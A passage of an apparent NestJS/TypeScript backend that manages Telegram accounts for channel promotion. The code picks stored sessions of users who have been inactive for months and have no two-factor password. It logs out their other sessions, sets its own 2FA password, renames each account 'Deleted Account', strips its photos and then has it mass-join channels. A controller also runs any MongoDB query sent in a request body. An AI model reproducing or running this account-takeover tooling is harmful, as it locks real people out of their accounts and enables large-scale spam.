Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreatePromoteClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'lastActive identifier',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly lastActive: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchPromoteClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the promoteClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\n\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiQuery } from '@nestjs/swagger';\nimport { PromoteClientService } from './promote-client.service';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\nimport { PromoteClient } from './schemas/promote-client.schema';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\n\n@ApiTags('Promote Clients')\n@Controller('promoteclients')\nexport class PromoteClientController {\n  constructor(private readonly clientService: PromoteClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  @ApiQuery({ name: 'mobile', required: false, description: 'Mobile number' })\n  @ApiQuery({ name: 'firstName', required: false, description: 'First name' })\n  @ApiQuery({ name: 'lastName', required: false, description: 'Last name' })\n  @ApiQuery({ name: 'username', required: false, description: 'Username' })\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForPromoteClients')\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\n  async joinChannelsforPromoteClients(): Promise<string> {\n    return this.clientService.joinchannelForPromoteClients();\n  }\n\n  @Get('checkPromoteClients')\n  @ApiOperation({ summary: 'Check Promote Clients' })\n  async checkpromoteClients(): Promise<string> {\n    this.clientService.checkPromoteClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoPromoteClients')\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<PromoteClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsPromoteClient/:mobile')\n  @ApiOperation({ summary: 'Set as Promote Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsPromoteClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsPromoteClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteClientService } from './promote-client.service';\nimport { PromoteClientController } from './promote-client.controller';\nimport { PromoteClientSchema } from './schemas/promote-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => BufferClientModule),\n ],\n  controllers: [PromoteClientController],\n  providers: [PromoteClientService],\n  exports: [PromoteClientService]\n})\nexport class PromoteClientModule { }\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager'\n@Injectable()\nexport class PromoteClientService {\n    private readonly logger = new Logger(PromoteClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isLeaveChannelProcessing: boolean = false;\n    private isJoinChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n    ) {}\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        const newUser = new this.promoteClientModel(promoteClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<PromoteClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearPromoteMap() {\n        console.log(\"PromoteMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            this.logger.log('Starting join channel process');\n\n            // Clear both queues before starting new process\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n\n            try {\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());\n                this.logger.debug(`Using existing keys: ${existingkeys.join(', ')}`);\n\n                await connectionManager.disconnectAll();\n                await sleep(2000);\n\n                const clients = await this.promoteClientModel.find({\n                    channels: { \"$lt\": 300 },\n                    mobile: { $nin: existingkeys }\n                }).sort({ channels: 1 }).limit(4);\n\n                this.logger.debug(`Found ${clients.length} clients to process`);\n\n                if (clients.length > 0) {\n                    for (const document of clients) {\n                        try {\n                            this.logger.debug(`Processing client: ${document.mobile}`);\n                            const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: false });\n\n                            const channels = await client.channelInfo(true);\n                            this.logger.debug(`${document.mobile}: Found ${channels.ids.length} existing channels`);\n\n                            await this.update(document.mobile, { channels: channels.ids.length });\n\n                            if (channels.canSendFalseCount < 10) {\n                                if (channels.ids.length < 220) {\n                                    this.logger.debug(`${document.mobile}: Getting channels from channels service`);\n                                    const result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                                    this.joinChannelMap.set(document.mobile, result);\n                                    this.joinChannelQueue();\n                                } else {\n                                    this.logger.debug(`${document.mobile}: Getting channels from active channels service`);\n                                    const result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                                    this.joinChannelMap.set(document.mobile, result);\n                                    this.joinChannelQueue();\n                                }\n                            } else {\n                                this.logger.debug(`${document.mobile}: Too many channels with no send permissions, queueing for leave: ${channels.canSendFalseChats.length}`);\n                                this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);\n                                this.leaveChannelQueue();\n                            }\n                        } catch (error) {\n                            const errorDetails = parseError(error);\n                            this.logger.error(`Error processing client ${document.mobile}:`, errorDetails);\n\n                            if (error.message === \"SESSION_REVOKED\" ||\n                                error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                                error.message === \"USER_DEACTIVATED\" ||\n                                error.message === \"USER_DEACTIVATED_BAN\") {\n                                this.logger.warn(`${document.mobile}: Session invalid, removing client`);\n                                await this.remove(document.mobile);\n                            }\n                        } finally {\n                            connectionManager.unregisterClient(document.mobile);\n                        }\n                    }\n                }\n\n                this.logger.log(`Join channel process triggered successfully for ${clients.length} clients`);\n                return `Initiated Joining channels for ${clients.length}`;\n            } catch (error) {\n                this.logger.error('Error during joinchannelForPromoteClients:', error);\n                // Clean up on error\n                this.clearJoinChannelInterval();\n                this.clearLeaveChannelInterval();\n                throw new Error(\"Failed to initiate channel joining process\");\n            }\n        } else {\n            this.logger.warn('Ignored active check for promote channels as an active client setup exists');\n            return \"Active client setup exists, skipping promotion\";\n        }\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, skipping queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.log('Join channel map is empty, clearing interval');\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel interval at ${new Date().toISOString()}`);\n\n                for (const mobile of keys) {\n                    const channels = this.joinChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to join for ${mobile}, removing from map`);\n                        this.removeFromPromoteMap(mobile);\n                        continue;\n                    }\n\n                    const channel = channels.shift();\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.logger.debug(`${mobile}: Pending channels to join: ${channels.length}`);\n                        this.joinChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromPromoteMap(mobile);\n                    }\n\n                    try {\n                        await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile}: Attempting to join channel: @${channel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, channel);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                        this.logger.error(`${mobile}: Error joining @${channel.username}:`, errorDetails);\n\n                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);\n                            this.removeFromPromoteMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n                        if (error.errorMessage === \"SESSION_REVOKED\" ||\n                            error.errorMessage === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in join channel interval:', error);\n                this.clearJoinChannelInterval();\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug('Clearing join channel interval');\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n\n            // Only schedule next run if there are items in the map\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering join channel process after timeout');\n                    this.joinchannelForPromoteClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.logger.debug(`Removing mobile ${key} from leave map`);\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.logger.log('Leave map is now empty');\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        this.logger.debug('Clearing entire leave map');\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, 60000 - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    this.logger.debug(`Processing leave channels for mobile: ${mobile}`);\n                    const channels = this.leaveChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No channels to leave for mobile: ${mobile}`);\n                        this.removeFromLeaveMap(mobile);\n                        continue;\n                    }\n\n                    const channelsToProcess = channels.splice(0, 10);\n\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.logger.debug(`${mobile}: Processing ${channelsToProcess.length} channels, ${channels.length} remaining`);\n                        this.leaveChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromLeaveMap(mobile);\n                    }\n\n                    try {\n                        const client = await connectionManager.getClient(mobile, { autoDisconnect: false, handler: false });\n                        this.logger.debug(`${mobile}: Attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile}: Successfully left ${channelsToProcess.length} channels`);\n                    } catch (error) {\n                        const errorDetails = parseError(error);\n                        this.logger.error(`Error in leave channel process for ${mobile}:`, errorDetails);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.warn(`${mobile}: Session invalid, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n                    } finally {\n                        await connectionManager.unregisterClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in leave channel interval:', error);\n                this.clearLeaveChannelInterval();\n            }\n        }, 60000);\n\n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\n            const telegramClient = await connectionManager.getClient(mobile, { autoDisconnect: false });\n            try {\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const promoteClient = {\n                    tgId: user.tgId,\n                    lastActive: \"default\",\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await connectionManager.unregisterClient(mobile)\n            return \"Client set as promote successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkPromoteClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await connectionManager.disconnectAll()\n            await sleep(2000);\n            const promoteclients = await this.findAll();\n            let goodIds: string[] = [];\n            const badIds: string[] = [];\n            if (promoteclients.length < 80) {\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const bufferClients = await this.bufferClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const bufferClientIds = bufferClients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of promoteclients) {\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await connectionManager.getClient(document.mobile, { autoDisconnect: false, handler: true });\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000);\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            await sleep(2000);\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword && badIds.length < 4) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile);\n                    } finally {\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoPromoteClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check promote channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New promote documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await connectionManager.getClient(document.mobile, { autoDisconnect: false });\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const promoteClient = {\n                            tgId: document.tgId,\n                            lastActive: \"today\",\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(promoteClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created PromoteClient=============\")\n                        await connectionManager.unregisterClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as PromoteClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await connectionManager.unregisterClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await connectionManager.unregisterClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await connectionManager.unregisterClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForPromoteClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { PromoteMsgsService } from './promote-msgs.service';\n\n@ApiTags('Promote-msgs')\n@Controller('promote-msgs')\nexport class PromoteMsgsController {\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get promote-msgs data' })\n  